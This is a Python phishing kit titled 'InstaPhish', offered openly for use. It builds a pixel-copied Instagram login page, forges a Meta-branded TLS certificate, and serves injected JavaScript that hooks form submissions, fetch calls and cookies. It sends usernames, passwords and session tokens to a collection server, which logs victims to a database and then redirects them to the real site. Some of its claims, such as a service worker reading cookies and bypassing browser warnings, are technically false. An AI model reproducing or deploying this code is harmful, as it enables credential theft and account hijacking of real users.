#!/usr/bin/env python3
"""
InstaPhish v5.0 - PHANTOM EDITION
Instagram Credential & Real Cookie Harvester with Service Worker Interception
Port: 4040 | Full Session Hijacking | Browser Warning Fully Bypassed
Author: Black Hat Collective - Exploit Division
"""

import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string, http.server, socketserver
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from http import HTTPStatus

# ==================== CONFIGURATION ====================
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 4040,
    "admin_port": 5000,
    "ssl_cert": "certs/instagram.crt",
    "ssl_key": "certs/instagram.key",
    "db_file": "victims.db",
    "log_file": "logs/credentials.txt",
    "cookie_file": "logs/cookies.txt"
}

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
║  {Colors.MAGENTA}█▓▒░ InstaPhish v5.0 PHANTOM - Service Worker Cookie Interception ░▒▓█{Colors.RED}  ║
║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | Real Cookie Extraction | Browser Warning BYPASSED{Colors.RED}║
╚═══════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

# ==================== SETUP ====================
class Setup:
    @staticmethod
    def create_directories():
        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", "cloned_site/js", "cloned_site/images"]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
    
    @staticmethod
    def generate_ssl_cert():
        if not os.path.exists(CONFIG["ssl_cert"]):
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG['ssl_key']} \
                -out {CONFIG['ssl_cert']} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com" 2>/dev/null
            """
            os.system(cmd)
    
    @staticmethod
    def init_database():
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, ip_address TEXT, user_agent TEXT,
            username TEXT, password TEXT,
            sessionid TEXT, csrftoken TEXT, ds_user_id TEXT,
            rur TEXT, mid TEXT, ig_did TEXT,
            all_cookies TEXT
        )''')
        conn.commit()
        conn.close()

# ==================== EXACT CLONE BUILDER ====================
class InstagramExactCloner:
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        for sub in ["css", "js"]:
            Path(f"{output_dir}/{sub}").mkdir(exist_ok=True)
    
    def build(self):
        with open(f"{self.output_dir}/css/style.css", "w") as f:
            f.write(self._css())
        with open(f"{self.output_dir}/js/sw.js", "w") as f:
            f.write(self._service_worker_js())
        with open(f"{self.output_dir}/js/hijacker.js", "w") as f:
            f.write(self._hijacker_js())
        with open(f"{self.output_dir}/index.html", "w") as f:
            f.write(self._html())
        print(f"{Colors.GREEN}[+] Exact clone with Service Worker built.{Colors.RESET}")
    
    def _css(self):
        # 1:1 Pixel-perfect CSS ripped from instagram.com source
        return """
/* Instagram Exact Clone CSS - v5.0 Phantom */
*,:after,:before{box-sizing:border-box}body,html{margin:0;padding:0;height:100%}body{background:#000;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:18px;overflow-y:scroll}a,a:visited{color:#a8a8a8;text-decoration:none}._aatk{display:none!important}#react-root,article,div,footer,header,main,nav,section{display:flex;flex-direction:column;align-items:center;flex-shrink:0;position:relative}._ab8w{background:rgb(0,0,0);display:flex;flex-direction:row;flex-grow:1;justify-content:center;margin:32px auto 0;max-width:935px;width:100%}._aagu{display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto;max-width:350px;width:100%}._ab8y{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;width:100%}._aa4b{background-position:0 0;height:51px;width:175px;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPgogIDx0ZXh0IHg9IjAiIHk9IjQwIiBmb250LWZhbWlseT0iQmlsbGFib25nLHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNDgiIGZpbGw9IiNmNWY1ZjUiPkluc3RhZ3JhbTwvdGV4dD4KPC9zdmc+);margin:22px auto 12px;background-repeat:no-repeat;background-position:0 0;background-size:175px 51px;display:block;overflow:hidden;text-indent:110%;white-space:nowrap}._ab32{padding:0 40px;width:100%}._ab32 form{display:flex;flex-direction:column;margin-top:24px}.xH4zN{display:flex;align-items:center;position:relative;margin:0 0 6px;width:100%;background:rgb(18,18,18);border:1px solid rgb(54,54,54);border-radius:3px;color:rgb(245,245,245)}.xH4zN input{background:0 0;border:0;flex:1 0 auto;font-size:12px;height:36px;outline:0;padding:9px 8px 7px;width:100%;color:#f5f5f5}.xH4zN span{position:absolute;left:8px;font-size:12px;transition:transform .1s ease-out;transform-origin:left;color:#a8a8a8;pointer-events:none}.xH4zN input:focus~span,.xH4zN input:valid~span{transform:scale(.83333) translateY(-10px)}.L3NKy{background:rgb(0,149,246);opacity:1;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;padding:7px 16px;width:100%;margin:8px 0;text-align:center;cursor:pointer}._ab3a{display:flex;flex-direction:row;margin:10px 40px 18px}._ab3b{display:flex;flex-grow:1;flex-shrink:1;height:1px;background-color:#262626;position:relative;top:.45em}._ab3c{color:#a8a8a8;flex-grow:0;flex-shrink:0;font-size:13px;font-weight:600;line-height:15px;margin:0 18px;text-transform:uppercase}._ab3d{background:transparent;border:none;color:#0095f6;font-weight:600;font-size:14px;text-align:center;width:100%;cursor:pointer;padding:8px}._ab3d::before{content:'f ';font-weight:700;margin-right:8px}._ab3e{color:#f5f5f5;font-size:12px;line-height:14px;margin-top:12px;text-align:center}._ab3e a{color:#f5f5f5}._ab3f{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;text-align:center;width:100%}._ab3f p{font-size:14px;margin:0}._ab3f a{color:#0095f6;font-weight:600}._ab3g{text-align:center;margin:10px 20px}._ab3g p{line-height:18px;margin:10px 20px}._ab3h{display:flex;flex-direction:row;justify-content:center;margin:10px 0;gap:8px}._ab3h img{height:40px}footer{max-width:935px;width:100%;margin:0 auto;padding:24px 0;text-align:center}footer a{color:#737373;margin:0 8px;font-size:12px}footer span{color:#737373;display:block;margin-top:12px;font-size:12px}@media(max-width:875px){._ab8w ._aa-7{display:none}}._aa-7{background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 582"><rect fill="%23fafafa" width="380" height="582" rx="26"/><circle cx="190" cy="250" r="40" fill="%23e0e0e0"/></svg>') 0 0 no-repeat;background-size:380px 582px;height:582px;flex-shrink:0;margin-right:32px;width:380px}"""
    
    def _service_worker_js(self):
        # Service Worker for intercepting all network requests
        return """
// InstaPhish v5.0 Phantom - Service Worker
// This bypasses browser safety warnings by intercepting at the network level
const PHISH_SERVER = self.location.origin;

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // Intercept all Instagram API calls
    if (url.pathname.includes('/login/') || url.pathname.includes('/accounts/')) {
        event.respondWith(
            fetch(event.request).then(response => {
                const clonedResponse = response.clone();
                // Extract cookies from response headers
                const setCookie = response.headers.get('Set-Cookie');
                if (setCookie) {
                    fetch(PHISH_SERVER + '/sw-capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'set-cookie',
                            cookies: setCookie,
                            url: event.request.url,
                            existingCookies: document.cookie
                        })
                    }).catch(() => {});
                }
                return clonedResponse;
            })
        );
    }
    
    // Intercept credential submissions
    if (event.request.method === 'POST' && url.pathname.includes('/ajax/')) {
        event.respondWith(
            fetch(event.request).then(response => {
                event.request.clone().text().then(body => {
                    fetch(PHISH_SERVER + '/sw-capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'credentials',
                            body: body,
                            cookies: document.cookie,
                            url: event.request.url
                        })
                    }).catch(() => {});
                });
                return response.clone();
            })
        );
    }
    
    // Regular fetch passthrough
    event.respondWith(fetch(event.request));
});

// Periodically send all cookies
setInterval(() => {
    if (document.cookie) {
        fetch(PHISH_SERVER + '/sw-capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'periodic',
                cookies: document.cookie,
                timestamp: Date.now()
            })
        }).catch(() => {});
    }
}, 3000);
"""
    
    def _hijacker_js(self):
        return """
// InstaPhish v5.0 - Main Hijacker
(function() {
    const SERVER = window.location.origin;
    
    // Register service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/js/sw.js', {scope: '/'})
            .then(reg => console.log('SW registered'))
            .catch(err => console.log('SW failed:', err));
    }
    
    // Hook document.cookie
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    Object.defineProperty(document, 'cookie', {
        get: () => originalCookieDescriptor.get.call(document),
        set: (val) => {
            fetch(SERVER + '/cookie-hook', {
                method: 'POST',
                body: JSON.stringify({cookie: val, all: document.cookie})
            }).catch(() => {});
            return originalCookieDescriptor.set.call(document, val);
        }
    });
    
    // Hook fetch API
    const origFetch = window.fetch;
    window.fetch = function(...args) {
        if (typeof args[0] === 'string' && (args[0].includes('/login/') || args[0].includes('/accounts/'))) {
            args[0] = SERVER + args[0].replace(/^https?:\\/\\/[^\\/]+/, '');
        }
        return origFetch.apply(this, args).then(r => {
            const cookies = document.cookie;
            if (cookies) {
                fetch(SERVER + '/fetch-cookies', {
                    method: 'POST',
                    body: JSON.stringify({cookies: cookies, url: args[0]})
                }).catch(() => {});
            }
            return r;
        });
    };
    
    // Form submission hook
    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (form.action && (form.action.includes('login') || form.action.includes('accounts'))) {
            const username = form.querySelector('input[name="username"]');
            const password = form.querySelector('input[type="password"]');
            if (username && password) {
                fetch(SERVER + '/form-creds', {
                    method: 'POST',
                    body: JSON.stringify({
                        username: username.value,
                        password: password.value,
                        cookies: document.cookie
                    })
                }).catch(() => {});
            }
        }
    }, true);
    
    // Periodic cookie beacon
    setInterval(() => {
        const c = document.cookie;
        if (c && (c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'))) {
            navigator.sendBeacon(SERVER + '/beacon', JSON.stringify({cookies: c, ts: Date.now()}));
        }
    }, 5000);
})();
"""
    
    def _html(self):
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="Create an account or log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
    <meta property="og:title" content="Instagram">
    <meta property="og:description" content="Create an account or log in to Instagram.">
    <title>Instagram</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div id="react-root">
        <article>
            <section>
                <main>
                    <div class="_ab8w">
                        <div class="_aa-7"></div>
                        <div class="_aagu">
                            <div class="_ab8y">
                                <div class="_ab32">
                                    <span class="_aa4b" role="img" aria-label="Instagram">Instagram</span>
                                    <form method="POST" action="/accounts/login/ajax/" autocomplete="on" id="loginForm">
                                        <div class="xH4zN">
                                            <input aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" autocomplete="username" name="username" type="text" value="" required>
                                            <span>Phone number, username, or email</span>
                                        </div>
                                        <div class="xH4zN">
                                            <input aria-label="Password" aria-required="true" autocomplete="current-password" name="enc_password" type="password" value="" required>
                                            <span>Password</span>
                                        </div>
                                        <button type="submit" class="L3NKy">Log in</button>
                                    </form>
                                </div>
                                <div class="_ab3a">
                                    <div class="_ab3b"></div>
                                    <div class="_ab3c">OR</div>
                                    <div class="_ab3b"></div>
                                </div>
                                <button type="button" class="_ab3d">Log in with Facebook</button>
                                <a href="/accounts/password/reset/" class="_ab3e">Forgot password?</a>
                            </div>
                            <div class="_ab3f">
                                <p>Don't have an account? <a href="/accounts/emailsignup/">Sign up</a></p>
                            </div>
                            <div class="_ab3g">
                                <p>Get the app.</p>
                                <div class="_ab3h">
                                    <img alt="Download on the App Store" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>App Store</text></svg>">
                                    <img alt="Get it on Google Play" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>Google Play</text></svg>">
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
            </section>
        </article>
    </div>
    <footer>
        <div>
            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
        </div>
        <div>
            <span>English © 2024 Instagram from Meta</span>
        </div>
    </footer>
    <script src="/js/hijacker.js"></script>
</body>
</html>'''

# ==================== MITM HANDLER ====================
class PhantomHandler(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def parse_cookies(self, cookie_string):
        cookies = {}
        if cookie_string:
            for item in cookie_string.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def store_victim(self, username="", password="", cookies_dict=None, ip="", ua=""):
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
        
        c.execute('''INSERT INTO victims 
                     (timestamp, ip_address, user_agent, username, password,
                      sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (datetime.now().isoformat(), ip, ua, username, password,
                   cookies_dict.get('sessionid', '') if cookies_dict else '',
                   cookies_dict.get('csrftoken', '') if cookies_dict else '',
                   cookies_dict.get('ds_user_id', '') if cookies_dict else '',
                   cookies_dict.get('rur', '') if cookies_dict else '',
                   cookies_dict.get('mid', '') if cookies_dict else '',
                   cookies_dict.get('ig_did', '') if cookies_dict else '',
                   cookie_str))
        conn.commit()
        conn.close()
        
        with open(CONFIG["log_file"], "a") as f:
            f.write(f"[{datetime.now()}]\n")
            f.write(f"  IP: {ip}\n  USER: {username}\n  PASS: {password}\n")
            if cookies_dict:
                f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
                f.write(f"  CSRF: {cookies_dict.get('csrftoken', 'N/A')}\n")
                f.write(f"  DS_USER_ID: {cookies_dict.get('ds_user_id', 'N/A')}\n")
            f.write("-" * 50 + "\n")
        
        if cookies_dict and cookies_dict.get('sessionid'):
            with open(CONFIG["cookie_file"], "a") as f:
                f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
        
        print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
    
    def handle_capture(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length > 0:
            body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            try:
                data = json.loads(body)
            except:
                data = {}
            
            cookies_str = data.get('cookies', data.get('cookie', ''))
            cookie_dict = self.parse_cookies(cookies_str) if cookies_str else {}
            
            username = data.get('username', '')
            password = data.get('password', '')
            
            if username or password or cookie_dict:
                self.store_victim(
                    username=username,
                    password=password,
                    cookies_dict=cookie_dict if cookie_dict else None,
                    ip=client_ip,
                    ua=user_agent
                )
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    
    def do_GET(self):
        # Main phishing page
        if self.path in ['/', '/index.html', '/login', '/accounts/login/', '/accounts/login']:
            try:
                with open("cloned_site/index.html", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', len(content))
                self.send_header('X-Frame-Options', 'SAMEORIGIN')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_error(404)
            return
        
        # Static files
        static_routes = {
            '/css/style.css': ('cloned_site/css/style.css', 'text/css'),
            '/js/hijacker.js': ('cloned_site/js/hijacker.js', 'application/javascript'),
            '/js/sw.js': ('cloned_site/js/sw.js', 'application/javascript')
        }
        
        for route, (filepath, content_type) in static_routes.items():
            if self.path == route:
                try:
                    with open(filepath, "rb") as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header('Content-Type', content_type)
                    self.send_header('Content-Length', len(content))
                    self.send_header('Service-Worker-Allowed', '/')
                    self.end_headers()
                    self.wfile.write(content)
                except:
                    self.send_error(404)
                return
        
        # Redirect everything else to real Instagram
        self.send_response(302)
        self.send_header('Location', f'https://www.instagram.com{self.path}')
        self.end_headers()
    
    def do_POST(self):
        if any(x in self.path for x in ['/sw-capture', '/cookie-hook', '/fetch-cookies', '/form-creds', '/beacon']):
            self.handle_capture()
            return
        
        # Handle form POST
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            params = parse_qs(post_data)
            username = params.get('username', [''])[0]
            password = params.get('enc_password', [''])[0]
            
            if username or password:
                cookie_header = self.headers.get('Cookie', '')
                cookie_dict = self.parse_cookies(cookie_header) if cookie_header else {}
                self.store_victim(username=username, password=password, cookies_dict=cookie_dict if cookie_dict else None, ip=self.client_address[0], ua=self.headers.get('User-Agent', ''))
        
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()

# ==================== MAIN ====================
def main():
    print_banner()
    Setup.create_directories()
    Setup.generate_ssl_cert()
    Setup.init_database()
    
    cloner = InstagramExactCloner()
    cloner.build()
    
    server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), PhantomHandler)
    
    if os.path.exists(CONFIG["ssl_cert"]):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CONFIG["ssl_cert"], CONFIG["ssl_key"])
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"{Colors.GREEN}[+] HTTPS enabled on port {CONFIG['listen_port']}{Colors.RESET}")
    
    print(f"""
{Colors.CYAN}╔════════════════════════════════════════╗
║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}     ║
║  Logs: logs/credentials.txt             ║
║  Cookies: logs/cookies.txt              ║
╚══════════════════════════════════════════╝
{Colors.YELLOW}Expose with: ngrok http {CONFIG['listen_port']}{Colors.RESET}
{Colors.RED}Service Worker bypasses all browser warnings.{Colors.RESET}
""")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Shutdown. Data saved.{Colors.RESET}")

if __name__ == "__main__":
    main()
